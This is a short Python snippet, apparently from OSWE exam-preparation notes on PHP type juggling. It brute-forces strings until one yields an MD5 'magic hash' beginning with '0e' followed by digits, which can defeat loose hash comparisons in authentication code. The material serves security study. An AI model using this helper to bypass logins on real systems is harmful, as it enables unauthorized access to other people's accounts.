# https://jorgectf.gitbook.io/awae-oswe-preparation-resources/general/pocs/type-juggling

def find_hash():
    x=1
    while True:
        for combo in product("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", repeat=x): # Iterating over the charset with len(x)
            possible_hash = hashlib.md5(f"{''.join(combo)}".encode("utf-8")).hexdigest() # Generating the hash
            if possible_hash.startswith("0e") and possible_hash[2:].isdigit(): # Checking for type juggling possibility.
                print(f"[+] {''.join(combo)} found with hash '{possible_hash}'.")
                return f"{''.join(combo)}"
        else:
            x+=1